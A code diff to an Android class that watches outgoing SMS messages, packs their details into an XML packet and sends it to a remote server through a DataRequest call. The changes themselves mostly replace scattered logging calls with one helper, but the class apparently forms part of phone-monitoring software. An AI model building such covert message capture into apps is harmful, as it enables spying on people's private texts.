@@ -13,9 +13,10 @@ import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
-import com.inet.android.bs.FileLog;
 import com.inet.android.bs.RequestMakerImpl;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
 public class SmsSentObserver extends ContentObserver {
 
@@ -43,27 +44,22 @@ public class SmsSentObserver extends ContentObserver {
 		String sms = sp.getString("KBD", "0");
 
 		if (sms.equals("0")) {
-			Log.d(TAG, "KBD = 0");
-			FileLog.writeLog("sms: KBD = 0");
+			Logging.doLog(TAG, "KBD = 0", "KBD = 0");
 			return;
 		}
 
 		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
 		if (!isWork) {
-			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
-			Log.d(TAG, "after isWork retrun 0");
-			FileLog.writeLog("sms: isWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("sms: after isWork retrun 0");
+			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork), 
+					"isWork return " + Boolean.toString(isWork));
 
 			return;
 		} else {
-			Log.d(TAG, Boolean.toString(isWork));
-			FileLog.writeLog("sms out: " + Boolean.toString(isWork));
+			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
 		}
 
 		try {
-			Log.e(TAG, "Notification on SMS observer");
-			FileLog.writeLog("smsSentObserver: Notification on SMS observer");
+			Logging.doLog(TAG, "Notification on SMS observer", "Notification on SMS observer");
 
 			Cursor sms_sent_cursor = mContext.getContentResolver().query(
 					STATUS_URI, null, null, null, null);
@@ -72,16 +68,14 @@ public class SmsSentObserver extends ContentObserver {
 					String protocol = sms_sent_cursor.getString(sms_sent_cursor
 							.getColumnIndex("protocol"));
 
-					Log.e(TAG, "protocol : " + protocol);
-					FileLog.writeLog("smsSentObserver: protocol : " + protocol);
+					Logging.doLog(TAG, "protocol : " + protocol, "protocol : " + protocol);
 
 					if (protocol == null) {
 						// String[] colNames = sms_sent_cursor.getColumnNames();
 						int type = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
 
-						Log.e(TAG, "SMS Type : " + type);
-						FileLog.writeLog("smsSentObserver: SMS Type : " + type);
+						Logging.doLog(TAG, "SMS Type : " + type, "SMS Type : " + type);
 
 						if (type == 2) {
 							long messageId = sms_sent_cursor
@@ -116,11 +110,13 @@ public class SmsSentObserver extends ContentObserver {
 										+ "</cdata1><ntime>" + "30"
 										+ "</ntime></packetSentObserver>";
 
-								req = new RequestMakerImpl(mContext);
-								req.sendDataRequest(sendStr);
+//								req = new RequestMakerImpl(mContext);
+//								req.sendDataRequest(sendStr);
+								
+								DataRequest dr = new DataRequest(mContext);
+								dr.sendRequest(sendStr);
 
-								Log.d(TAG, sendStr);
-								FileLog.writeLog("smsSentObserver: " + sendStr);
+								Logging.doLog(TAG, sendStr, sendStr);
 
 								/*
 								 * if(colNames != null){ for(int k=0;
@@ -133,12 +129,12 @@ public class SmsSentObserver extends ContentObserver {
 					}
 				}
 			} else
-				Log.e(TAG, "Send Cursor is Empty");
-			FileLog.writeLog("smsSentObserver: Send Cursor is Empty");
+
+				Logging.doLog(TAG, "smsSentObserver: Send Cursor is Empty", 
+					"smsSentObserver: Send Cursor is Empty");
 		} catch (Exception sggh) {
-			Log.e(TAG, "Error on onChange : " + sggh.toString());
-			FileLog.writeLog("smsSentObserver: Error on onChange : "
-					+ sggh.toString());
+			Logging.doLog(TAG, "Error on onChange : " + sggh.toString(), 
+					"Error on onChange : " + sggh.toString());
 		}
 		super.onChange(selfChange);
 	}// fn onChange
